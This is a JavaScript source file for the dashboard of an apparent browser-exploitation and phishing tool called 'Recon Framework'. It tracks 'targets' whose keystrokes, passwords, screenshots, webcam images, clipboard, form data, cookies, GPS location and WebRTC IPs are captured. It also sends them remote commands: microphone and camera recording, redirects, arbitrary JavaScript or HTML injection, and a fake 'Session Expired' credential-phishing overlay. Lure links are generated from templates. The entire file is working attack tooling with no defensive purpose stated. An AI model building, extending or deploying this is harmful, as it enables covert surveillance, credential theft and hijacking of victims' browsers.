// RECON FRAMEWORK v2.0 - Dashboard Frontend Controller
// Professional UI with Font Awesome Icons

(function () {
  "use strict";

  var state = {
    sessions: [],
    currentSession: null,
    activeTab: "overview",
    socket: null,
    refreshInterval: null,
    feedItems: [],
    maxFeedItems: 200,
  };

  // SOCKET.IO

  function initSocket() {
    if (typeof io === "undefined") return;
    state.socket = io(window.location.origin, {
      transports: ["websocket", "polling"],
    });

    state.socket.on("connect", function () {
      updateConnectionStatus(true);
    });
    state.socket.on("disconnect", function () {
      updateConnectionStatus(false);
    });

    state.socket.on("new_session", function (data) {
      showToast(
        "New Target Connected",
        "IP: " + data.ip + " | " + (data.ua.browser || "?"),
        "success",
        "fa-crosshairs",
      );
      refreshSessions();
      addFeedItem("session", data.ip + " connected", data.time);
    });

    state.socket.on("data_update", function (data) {
      addFeedItem(data.type, data.preview, data.time);
      if (data.type === "creds") {
        showToast(
          "Credentials Captured!",
          "Session: " + data.session_id.substring(0, 8),
          "danger",
          "fa-key",
        );
      }
      if (state.currentSession && state.currentSession === data.session_id) {
        refreshSessionDetail(data.session_id);
      }
      updateLiveFeed();
    });

    state.socket.on("image_captured", function (data) {
      var label = data.type === "screenshot" ? "Screenshot" : "Camera Capture";
      showToast(label + " Received", data.filename, "info", "fa-camera");
      if (state.currentSession === data.session_id) {
        refreshSessionDetail(data.session_id);
      }
    });
  }

  function updateConnectionStatus(ok) {
    var el = document.getElementById("connection-status");
    if (!el) return;
    if (ok) {
      el.innerHTML = '<span class="live-dot"></span> Connected';
      el.className = "live-indicator";
      el.removeAttribute("style");
    } else {
      el.innerHTML =
        '<i class="fas fa-circle" style="font-size:8px"></i> Offline';
      el.className = "live-indicator";
      el.style.cssText =
        "color:var(--danger);background:var(--danger-bg);border-color:rgba(239,68,68,0.2);";
    }
  }

  // API

  function apiGet(url, cb) {
    fetch(url, { credentials: "same-origin" })
      .then(function (r) {
        if (r.status === 401) {
          window.location.href = "/login";
          return null;
        }
        return r.json();
      })
      .then(function (d) {
        if (d && cb) cb(d);
      })
      .catch(function (e) {
        console.error("GET:", e);
      });
  }

  function apiPost(url, body, cb) {
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "same-origin",
      body: JSON.stringify(body),
    })
      .then(function (r) {
        return r.json();
      })
      .then(function (d) {
        if (cb) cb(d);
      })
      .catch(function (e) {
        console.error("POST:", e);
      });
  }

  function apiDelete(url, cb) {
    fetch(url, { method: "DELETE", credentials: "same-origin" })
      .then(function (r) {
        return r.json();
      })
      .then(function (d) {
        if (cb) cb(d);
      })
      .catch(function (e) {
        console.error("DEL:", e);
      });
  }

  // UTILITIES

  function escapeHtml(str) {
    if (!str) return "";
    var map = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    };
    return String(str).replace(/[&<>"']/g, function (c) {
      return map[c];
    });
  }

  function setTextById(id, val) {
    var el = document.getElementById(id);
    if (el) el.textContent = val !== undefined && val !== null ? val : "—";
  }

  function isActive(lastSeen) {
    if (!lastSeen) return false;
    return Date.now() - new Date(lastSeen).getTime() < 300000;
  }

  function timeAgo(d) {
    if (!d) return "—";
    var s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
    if (s < 5) return "just now";
    if (s < 60) return s + "s ago";
    var m = Math.floor(s / 60);
    if (m < 60) return m + "m ago";
    var h = Math.floor(m / 60);
    if (h < 24) return h + "h ago";
    return Math.floor(h / 24) + "d ago";
  }

  function formatDate(d) {
    if (!d) return "—";
    try {
      return new Date(d).toLocaleString();
    } catch (e) {
      return d;
    }
  }

  function formatTime(d) {
    if (!d) return "—";
    try {
      return new Date(d).toLocaleTimeString();
    } catch (e) {
      return "—";
    }
  }

  // SESSIONS TABLE

  function refreshSessions() {
    apiGet("/api/sessions", function (data) {
      state.sessions = data.sessions || [];
      renderSessionsTable(state.sessions);
      updateStatsBadges(data);
    });
  }

  function renderSessionsTable(sessions) {
    var tbody = document.getElementById("sessions-tbody");
    if (!tbody) return;

    if (!sessions.length) {
      tbody.innerHTML =
        '<tr><td colspan="8" class="table-empty"><div class="empty-state">' +
        '<i class="fas fa-satellite-dish"></i>' +
        "<p>No sessions yet. Generate a link to begin.</p>" +
        "</div></td></tr>";
      return;
    }

    var rows = "";
    sessions.forEach(function (s) {
      var on = isActive(s.last_seen);
      var statusBadge = on
        ? '<span class="badge badge-success"><span class="status-dot"></span>Active</span>'
        : '<span class="badge badge-danger"><span class="status-dot"></span>Offline</span>';
      var devIcon = s.is_mobile ? "fa-mobile-alt" : "fa-desktop";

      rows +=
        '<tr class="clickable" onclick="window.RF.viewSession(\'' +
        s.id +
        "')\">" +
        '<td><i class="fas ' +
        devIcon +
        ' text-muted" style="margin-right:6px;"></i>' +
        escapeHtml(s.ip) +
        "</td>" +
        "<td>" +
        escapeHtml(s.browser) +
        "</td>" +
        "<td>" +
        escapeHtml(s.os) +
        "</td>" +
        "<td>" +
        escapeHtml(s.country) +
        " " +
        escapeHtml(s.city) +
        "</td>" +
        "<td>" +
        statusBadge +
        "</td>" +
        '<td><div class="data-badges">' +
        '<span class="data-badge' +
        (s.keylogs ? " has-data" : "") +
        '"><i class="fas fa-keyboard"></i>' +
        s.keylogs +
        "</span>" +
        '<span class="data-badge' +
        (s.screenshots ? " has-data" : "") +
        '"><i class="fas fa-camera"></i>' +
        s.screenshots +
        "</span>" +
        '<span class="data-badge' +
        (s.credentials ? " has-data" : "") +
        '"><i class="fas fa-key"></i>' +
        s.credentials +
        "</span>" +
        "</div></td>" +
        '<td class="text-sm text-muted">' +
        timeAgo(s.last_seen) +
        "</td>" +
        "<td>" +
        '<button class="btn btn-xs btn-ghost" onclick="event.stopPropagation();window.RF.exportSession(\'' +
        s.id +
        '\')" title="Export"><i class="fas fa-download"></i></button> ' +
        '<button class="btn btn-xs btn-ghost-danger" onclick="event.stopPropagation();window.RF.deleteSession(\'' +
        s.id +
        '\')" title="Delete"><i class="fas fa-trash-alt"></i></button>' +
        "</td></tr>";
    });
    tbody.innerHTML = rows;
  }

  function updateStatsBadges(data) {
    var ss = data.sessions || [];
    setTextById("stat-total", ss.length);
    setTextById("stat-active", data.active || 0);
    var tk = 0,
      ts = 0,
      tc = 0;
    ss.forEach(function (s) {
      tk += s.keylogs || 0;
      ts += s.screenshots || 0;
      tc += s.credentials || 0;
    });
    setTextById("stat-keylogs", tk);
    setTextById("stat-screenshots", ts);
    setTextById("stat-credentials", tc);
  }

  // SESSION ACTIONS

  function viewSession(sid) {
    window.location.href = "/session/" + sid;
  }

  function deleteSession(sid) {
    if (!confirm("Delete session " + sid.substring(0, 8) + "...?")) return;
    apiDelete("/api/session/" + sid, function () {
      showToast("Session Deleted", "", "warning", "fa-trash-alt");
      refreshSessions();
      if (state.currentSession === sid) window.location.href = "/";
    });
  }

  function exportSession(sid) {
    window.open("/api/session/" + sid + "/export", "_blank");
  }

  // SESSION DETAIL

  function refreshSessionDetail(sid) {
    apiGet("/api/session/" + sid, function (d) {
      renderDetail(d);
    });
  }

  function initSessionDetail() {
    var el = document.getElementById("session-id-data");
    if (!el) return;
    var sid = el.getAttribute("data-sid");
    if (!sid) return;
    state.currentSession = sid;
    if (state.socket) state.socket.emit("join_monitor", { session_id: sid });
    refreshSessionDetail(sid);
    setInterval(function () {
      refreshSessionDetail(sid);
    }, 8000);
  }

  function renderDetail(s) {
    if (!s) return;

    // Info
    setTextById("d-ip", s.ip_address);
    setTextById("d-browser", (s.user_agent_parsed || {}).browser);
    setTextById("d-os", (s.user_agent_parsed || {}).os);
    setTextById("d-device", (s.user_agent_parsed || {}).device);
    setTextById("d-created", formatDate(s.created_at));
    setTextById("d-lastseen", timeAgo(s.last_seen));
    setTextById("d-status", s.status);
    setTextById("d-ua", s.user_agent_raw);

    // Geo
    var geo = s.ip_geolocation || {};
    setTextById("d-country", (geo.country || "?") + " / " + (geo.city || "?"));
    setTextById("d-isp", geo.isp);
    setTextById("d-org", geo.org);
    setTextById("d-as", geo.as);
    setTextById("d-lat", geo.lat);
    setTextById("d-lon", geo.lon);

    var bgeo = s.geolocation || [];
    if (bgeo.length) {
      var lg = bgeo[bgeo.length - 1];
      if (lg && lg.lat) {
        setTextById("d-gps-lat", lg.lat);
        setTextById("d-gps-lon", lg.lng);
        setTextById("d-gps-acc", (lg.accuracy || "?") + "m");
      }
    }

    // Hardware
    var hw = s.hardware_info || {};
    setTextById("d-gpu", hw.gpu);
    setTextById("d-gpu-vendor", hw.gpuVendor);
    setTextById("d-cores", hw.cores);
    setTextById(
      "d-memory",
      hw.memory !== "?" && hw.memory ? hw.memory + " GB" : "?",
    );

    // Screen
    var scr = s.screen_info || {};
    setTextById("d-screen", (scr.w || "?") + " × " + (scr.h || "?"));
    setTextById("d-colordepth", (scr.colorDepth || "?") + "-bit");

    // Battery
    var bt = s.battery_info || {};
    if (bt.level !== undefined) {
      setTextById(
        "d-battery",
        Math.round(bt.level * 100) + "%" + (bt.charging ? " (Charging)" : ""),
      );
    }

    // Timezone
    var tz = s.timezone_info || {};
    setTextById(
      "d-timezone",
      (tz.name || "?") +
        " (UTC" +
        (tz.offset
          ? (tz.offset > 0 ? "-" : "+") + Math.abs(tz.offset / 60)
          : "") +
        ")",
    );

    // Language
    setTextById("d-language", (s.language_info || {}).language);

    // Connection
    var cn = s.connection_info || {};
    setTextById(
      "d-connection",
      (cn.effectiveType || "?") +
        " | " +
        (cn.downlink || "?") +
        " Mbps | RTT " +
        (cn.rtt || "?") +
        "ms",
    );

    // WebRTC
    var rtc = s.webrtc_leaks || {};
    var rp = [];
    if (rtc.local && rtc.local.length)
      rp.push("Local: " + rtc.local.join(", "));
    if (rtc.public && rtc.public.length)
      rp.push("Public: " + rtc.public.join(", "));
    if (rtc.ipv6 && rtc.ipv6.length) rp.push("IPv6: " + rtc.ipv6.join(", "));
    setTextById("d-webrtc", rp.join(" | ") || "None detected");

    // Fingerprints
    setTextById("d-canvas-fp", s.canvas_fingerprint);
    setTextById("d-audio-fp", s.audio_fingerprint);
    setTextById("d-fonts", (s.font_list || []).join(", ") || "—");

    // Render complex
    renderKeylogs(s.keylog || []);
    renderCredentials(s.credentials || []);
    renderGallery("screenshots-gallery", s.screenshots || []);
    renderGallery("camera-gallery", s.camera_captures || []);
    renderClipboard(s.clipboard || []);
    renderFormData(s.form_data || []);
    renderSocial(s.social_media_detected || []);
    renderJson("d-permissions", s.permissions || {});
    renderJson("d-webgl-raw", s.webgl_fingerprint || {});
    renderJson("d-browser-raw", s.browser_data || {});
    renderCookies(s.cookies_observed || []);
    renderStorage("d-localstorage", s.local_storage || {});

    // Notes
    var ne = document.getElementById("d-notes");
    if (ne && !ne._editing) ne.value = s.notes || "";
  }

  // RENDER HELPERS

  function renderKeylogs(arr) {
    var el = document.getElementById("keylog-viewer");
    if (!el) return;
    if (!arr.length) {
      el.innerHTML =
        '<span class="text-muted">Waiting for keystrokes...</span>';
      return;
    }
    var h = "";
    arr.forEach(function (e) {
      if (typeof e !== "object") return;
      var k = e.key || "";
      if (k === "Enter")
        h += '<span class="k-special k-enter">Enter ⏎</span>\n';
      else if (k === "Backspace")
        h += '<span class="k-special k-backspace">⌫</span>';
      else if (k === "Tab") h += '<span class="k-special">Tab</span>';
      else if (k === " ") h += " ";
      else if (k === "Escape") h += '<span class="k-special">Esc</span>';
      else if (k === "Shift" || k === "Control" || k === "Alt" || k === "Meta")
        h += '<span class="k-special">' + escapeHtml(k) + "</span>";
      else if (k.startsWith("Arrow"))
        h += '<span class="k-special">' + escapeHtml(k) + "</span>";
      else if (k.length === 1) h += escapeHtml(k);
      else h += '<span class="k-special">' + escapeHtml(k) + "</span>";
    });
    el.innerHTML = h;
    el.scrollTop = el.scrollHeight;
  }

  function renderCredentials(arr) {
    var el = document.getElementById("creds-list");
    if (!el) return;
    if (!arr.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-lock"></i><p>No credentials captured</p></div>';
      return;
    }
    var h = "";
    arr.forEach(function (c) {
      if (typeof c !== "object") return;
      h +=
        '<div style="padding:14px 16px;border-bottom:1px solid var(--border-primary);">' +
        '<div class="text-sm mb-1"><i class="fas fa-user text-accent" style="width:18px;"></i> <span class="text-mono text-accent">' +
        escapeHtml(c.username || "N/A") +
        "</span></div>" +
        '<div class="text-sm mb-1"><i class="fas fa-key text-danger" style="width:18px;"></i> <span class="text-mono text-danger">' +
        escapeHtml(c.password || "N/A") +
        "</span></div>" +
        '<div class="text-xs text-muted"><i class="fas fa-link" style="width:18px;"></i> ' +
        escapeHtml(c.source || c.url || "?") +
        " &middot; " +
        formatDate(c._ts || c.ts) +
        "</div></div>";
    });
    el.innerHTML = h;
  }

  function renderGallery(id, items) {
    var el = document.getElementById(id);
    if (!el) return;
    if (!items.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-images"></i><p>No captures</p></div>';
      return;
    }
    var h = "";
    items.forEach(function (it) {
      if (typeof it !== "object" || !it.filename) return;
      h +=
        '<div class="gallery-item" onclick="window.RF.openImage(\'/api/capture/' +
        escapeHtml(it.filename) +
        "')\">" +
        '<img src="/api/capture/' +
        escapeHtml(it.filename) +
        '" loading="lazy" alt="capture">' +
        '<div class="gallery-meta"><i class="fas fa-clock"></i> ' +
        formatDate(it.timestamp) +
        "</div></div>";
    });
    el.innerHTML = h;
  }

  function renderClipboard(arr) {
    var el = document.getElementById("clipboard-list");
    if (!el) return;
    if (!arr.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-clipboard"></i><p>No clipboard data</p></div>';
      return;
    }
    var h = "";
    arr.forEach(function (c) {
      if (typeof c !== "object") return;
      var icon =
        c.event === "copy"
          ? "fa-copy"
          : c.event === "paste"
            ? "fa-paste"
            : "fa-cut";
      h +=
        '<div class="feed-item"><span class="feed-time"><i class="fas ' +
        icon +
        '"></i> ' +
        escapeHtml(c.event) +
        "</span>" +
        '<span class="feed-content">' +
        escapeHtml((c.content || "").substring(0, 300)) +
        "</span></div>";
    });
    el.innerHTML = h;
  }

  function renderFormData(arr) {
    var el = document.getElementById("formdata-list");
    if (!el) return;
    var subs = arr.filter(function (f) {
      return f && f.event === "submit";
    });
    if (!subs.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-edit"></i><p>No form submissions</p></div>';
      return;
    }
    var h = "";
    subs.forEach(function (f) {
      h +=
        '<div style="padding:12px 16px;border-bottom:1px solid var(--border-primary);">' +
        '<div class="text-sm text-accent mb-1"><i class="fas fa-paper-plane"></i> ' +
        escapeHtml(f.method || "?") +
        " → " +
        escapeHtml(f.action || "?") +
        "</div>";
      if (f.data) {
        Object.keys(f.data).forEach(function (k) {
          var v = f.data[k];
          h +=
            '<div class="text-xs text-mono text-secondary">' +
            escapeHtml(k) +
            ": " +
            escapeHtml(typeof v === "object" ? v.value || "" : v) +
            "</div>";
        });
      }
      h += "</div>";
    });
    el.innerHTML = h;
  }

  function renderSocial(arr) {
    var el = document.getElementById("social-list");
    if (!el) return;
    if (!arr.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-users"></i><p>No scan results</p></div>';
      return;
    }
    var h = "";
    arr.forEach(function (s) {
      if (typeof s !== "object") return;
      var icon = s.reachable
        ? '<i class="fas fa-check-circle text-success"></i>'
        : '<i class="fas fa-times-circle text-danger"></i>';
      h +=
        '<div class="feed-item"><span>' +
        icon +
        " " +
        escapeHtml(s.name) +
        '</span><span class="text-muted text-sm" style="margin-left:auto;">' +
        (s.loadTime || "?") +
        "ms</span></div>";
    });
    el.innerHTML = h;
  }

  function renderCookies(arr) {
    var el = document.getElementById("d-cookies");
    if (!el) return;
    if (!arr.length) {
      el.textContent = "No cookies observed";
      return;
    }
    var last = arr[arr.length - 1];
    el.textContent =
      typeof last === "object"
        ? last.cookies || JSON.stringify(last, null, 2)
        : String(last);
  }

  function renderStorage(id, data) {
    var el = document.getElementById(id);
    if (!el) return;
    if (!data || !Object.keys(data).length) {
      el.textContent = "Empty";
      return;
    }
    el.textContent = JSON.stringify(data, null, 2);
  }

  function renderJson(id, data) {
    var el = document.getElementById(id);
    if (!el) return;
    if (!data || (typeof data === "object" && !Object.keys(data).length)) {
      el.textContent = "No data";
      return;
    }
    el.textContent =
      typeof data === "string" ? data : JSON.stringify(data, null, 2);
  }

  // COMMANDS

  function sendCommand(sid, cmd, params) {
    apiPost(
      "/api/session/" + sid + "/command",
      { command: cmd, params: params || {} },
      function () {
        showToast("Command Sent", cmd, "info", "fa-terminal");
      },
    );
  }

  function initCommandButtons() {
    document.querySelectorAll("[data-cmd]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        var cmd = this.getAttribute("data-cmd");
        var sid = state.currentSession;
        if (!sid) return;

        var prompts = {
          microphone: function () {
            var d = prompt("Duration (sec):", "5");
            return d !== null ? { duration: parseInt(d) || 5 } : null;
          },
          camera: function () {
            var d = prompt("Duration (0=snap):", "0");
            return d !== null ? { duration: parseInt(d) || 0 } : null;
          },
          redirect: function () {
            var u = prompt("URL:");
            return u ? { url: u } : null;
          },
          inject_js: function () {
            var c = prompt("JS Code:");
            return c ? { code: c } : null;
          },
          inject_html: function () {
            var h = prompt("HTML:");
            return h ? { html: h } : null;
          },
          alert_box: function () {
            var m = prompt("Message:");
            return m ? { message: m } : null;
          },
          prompt_box: function () {
            var m = prompt("Prompt:");
            return m ? { message: m } : null;
          },
          phish_overlay: function () {
            var t = prompt("Title:", "Session Expired");
            var m = prompt("Message:", "Please re-enter your credentials.");
            return t !== null ? { title: t, message: m } : null;
          },
          notification: function () {
            var t = prompt("Title:", "New Message");
            var b = prompt("Body:", "You have a notification");
            return t !== null ? { title: t, body: b } : null;
          },
        };

        if (prompts[cmd]) {
          var p = prompts[cmd]();
          if (p === null) return;
          sendCommand(sid, cmd, p);
        } else {
          sendCommand(sid, cmd, {});
        }
      });
    });
  }

  // LINK GENERATOR

  function initLinkGenerator() {
    document.querySelectorAll(".template-card").forEach(function (card) {
      card.addEventListener("click", function () {
        document.querySelectorAll(".template-card").forEach(function (c) {
          c.classList.remove("selected");
        });
        this.classList.add("selected");
      });
    });

    var genBtn = document.getElementById("gen-link-btn");
    if (genBtn) {
      genBtn.addEventListener("click", function () {
        var sel = document.querySelector(".template-card.selected");
        var tpl = sel ? sel.getAttribute("data-template") : "blank";
        var cp = document.getElementById("custom-path");
        var path = cp ? cp.value.trim() : "";
        apiPost(
          "/api/generate_link",
          { template: tpl, path: path },
          function (data) {
            if (data.link) {
              var box = document.getElementById("gen-link-result");
              if (box) {
                box.classList.remove("hidden");
                box.querySelector("input").value = data.link;
              }
              showToast("Link Generated", data.link, "success", "fa-link");
            }
          },
        );
      });
    }

    var copyBtn = document.getElementById("copy-link-btn");
    if (copyBtn) {
      copyBtn.addEventListener("click", function () {
        var inp = document.querySelector("#gen-link-result input");
        if (!inp) return;
        inp.select();
        navigator.clipboard
          .writeText(inp.value)
          .then(function () {
            showToast("Copied!", "", "success", "fa-clipboard-check");
          })
          .catch(function () {
            document.execCommand("copy");
            showToast("Copied!", "", "success", "fa-clipboard-check");
          });
      });
    }
  }

  // LIVE FEED

  function addFeedItem(type, content, time) {
    state.feedItems.unshift({
      type: type,
      content: content,
      time: time || new Date().toISOString(),
    });
    if (state.feedItems.length > state.maxFeedItems)
      state.feedItems.length = state.maxFeedItems;
    updateLiveFeed();
  }

  function updateLiveFeed() {
    var el = document.getElementById("live-feed");
    if (!el) return;
    if (!state.feedItems.length) {
      el.innerHTML =
        '<div class="empty-state"><i class="fas fa-satellite-dish"></i><p>Waiting for data...</p></div>';
      return;
    }
    var h = "";
    state.feedItems.slice(0, 60).forEach(function (item) {
      h +=
        '<div class="feed-item">' +
        '<span class="feed-time">' +
        formatTime(item.time) +
        "</span>" +
        '<span class="feed-type ' +
        escapeHtml(item.type) +
        '">' +
        escapeHtml(item.type) +
        "</span>" +
        '<span class="feed-content">' +
        escapeHtml((item.content || "").substring(0, 200)) +
        "</span></div>";
    });
    el.innerHTML = h;
  }

  // SEARCH

  function initSearch() {
    var inp = document.getElementById("search-input");
    if (!inp) return;
    var timer = null;
    inp.addEventListener("input", function () {
      var val = this.value.trim().toLowerCase();
      clearTimeout(timer);
      if (!val) {
        renderSessionsTable(state.sessions);
        return;
      }
      timer = setTimeout(function () {
        var filtered = state.sessions.filter(function (s) {
          return JSON.stringify(s).toLowerCase().indexOf(val) !== -1;
        });
        renderSessionsTable(filtered);
      }, 300);
    });
  }

  // TABS

  function initTabs() {
    document.querySelectorAll(".tab-btn").forEach(function (btn) {
      btn.addEventListener("click", function () {
        var target = this.getAttribute("data-tab");
        if (!target) return;
        document.querySelectorAll(".tab-btn").forEach(function (t) {
          t.classList.remove("active");
        });
        document.querySelectorAll(".tab-panel").forEach(function (p) {
          p.classList.remove("active");
        });
        this.classList.add("active");
        var panel = document.getElementById("panel-" + target);
        if (panel) panel.classList.add("active");
        state.activeTab = target;
      });
    });
  }

  // NOTES

  function initNotes() {
    var ne = document.getElementById("d-notes");
    if (ne) {
      ne.addEventListener("focus", function () {
        this._editing = true;
      });
      ne.addEventListener("blur", function () {
        this._editing = false;
      });
    }
    var btn = document.getElementById("save-notes-btn");
    if (btn) {
      btn.addEventListener("click", function () {
        var n = document.getElementById("d-notes");
        if (n && state.currentSession) {
          apiPost(
            "/api/session/" + state.currentSession + "/notes",
            { notes: n.value },
            function () {
              showToast("Notes Saved", "", "success", "fa-save");
            },
          );
        }
      });
    }
  }

  // SIDEBAR TOGGLE - Desktop + Mobile

  function initSidebar() {
    var toggle = document.getElementById("sidebar-toggle");
    var sidebar = document.getElementById("sidebar");
    var overlay = document.getElementById("sidebar-overlay");
    var mainContent = document.querySelector(".main-content");

    if (!toggle || !sidebar) return;

    function isMobile() {
      return window.innerWidth <= 768;
    }

    function openSidebar() {
      sidebar.classList.remove("collapsed");
      sidebar.classList.add("open");
      if (isMobile()) {
        if (overlay) overlay.classList.add("show");
        document.body.style.overflow = "hidden";
      } else {
        // Desktop: geser main-content balik ke kanan
        if (mainContent) mainContent.classList.remove("sidebar-collapsed");
      }
    }

    function closeSidebar() {
      sidebar.classList.remove("open");
      sidebar.classList.add("collapsed");
      if (overlay) overlay.classList.remove("show");
      document.body.style.overflow = "";
      if (mainContent) mainContent.classList.add("sidebar-collapsed");
    }

    function isCollapsed() {
      return sidebar.classList.contains("collapsed");
    }

    toggle.addEventListener("click", function () {
      if (isCollapsed()) openSidebar();
      else closeSidebar();
    });

    // Overlay click tutup sidebar (mobile)
    if (overlay) {
      overlay.addEventListener("click", closeSidebar);
    }

    // Resize handler: saat resize ke desktop, bersihkan state mobile
    window.addEventListener("resize", function () {
      if (!isMobile()) {
        // Desktop: hapus overlay, unlock scroll
        if (overlay) overlay.classList.remove("show");
        document.body.style.overflow = "";
        // Sync margin-left: kalau sidebar terbuka, pastikan main-content punya margin
        if (!isCollapsed()) {
          if (mainContent) mainContent.classList.remove("sidebar-collapsed");
        }
      } else {
        // Mobile: sidebar selalu margin-left: 0
        if (mainContent) mainContent.classList.remove("sidebar-collapsed");
      }
    });
  }

  // TOAST

  function showToast(title, msg, type, iconClass) {
    type = type || "info";
    iconClass = iconClass || "fa-info-circle";

    var container = document.getElementById("toast-container");
    if (!container) {
      container = document.createElement("div");
      container.id = "toast-container";
      container.className = "toast-container";
      document.body.appendChild(container);
    }

    var toast = document.createElement("div");
    toast.className = "toast " + type;
    toast.innerHTML =
      '<div class="toast-icon"><i class="fas ' +
      iconClass +
      '"></i></div>' +
      '<div class="toast-body">' +
      '<div class="toast-title">' +
      escapeHtml(title) +
      "</div>" +
      (msg
        ? '<div class="toast-msg">' +
          escapeHtml(msg).substring(0, 120) +
          "</div>"
        : "") +
      "</div>";

    container.appendChild(toast);

    setTimeout(function () {
      toast.style.opacity = "0";
      toast.style.transform = "translateX(100%)";
      toast.style.transition = "all 0.3s ease";
      setTimeout(function () {
        toast.remove();
      }, 300);
    }, 4500);
  }

  // IMAGE MODAL

  function openImage(src) {
    var ov = document.createElement("div");
    ov.className = "modal-overlay show";
    ov.style.cursor = "pointer";
    ov.onclick = function () {
      ov.remove();
    };
    ov.innerHTML =
      '<div style="max-width:90%;max-height:90%;text-align:center;" onclick="event.stopPropagation()">' +
      '<img src="' +
      escapeHtml(src) +
      '" style="max-width:100%;max-height:80vh;border-radius:10px;box-shadow:var(--shadow-xl);">' +
      '<div style="margin-top:14px;">' +
      '<a href="' +
      escapeHtml(src) +
      '" download class="btn btn-sm btn-primary"><i class="fas fa-download"></i> Download</a> ' +
      '<button class="btn btn-sm btn-ghost" onclick="this.closest(\'.modal-overlay\').remove()"><i class="fas fa-times"></i> Close</button>' +
      "</div></div>";
    document.body.appendChild(ov);
  }

  // AUTO REFRESH

  function startAutoRefresh() {
    if (document.getElementById("sessions-tbody")) {
      refreshSessions();
      state.refreshInterval = setInterval(refreshSessions, 15000);
    }
  }

  // INIT

  function init() {
    initSocket();
    initSidebar();
    initTabs();
    initSearch();
    initCommandButtons();
    initLinkGenerator();
    initNotes();
    initSessionDetail();
    startAutoRefresh();
  }

  window.RF = {
    viewSession: viewSession,
    deleteSession: deleteSession,
    exportSession: exportSession,
    openImage: openImage,
    sendCommand: sendCommand,
    refresh: refreshSessions,
    showToast: showToast,
  };

  if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", init);
  else init();
})();
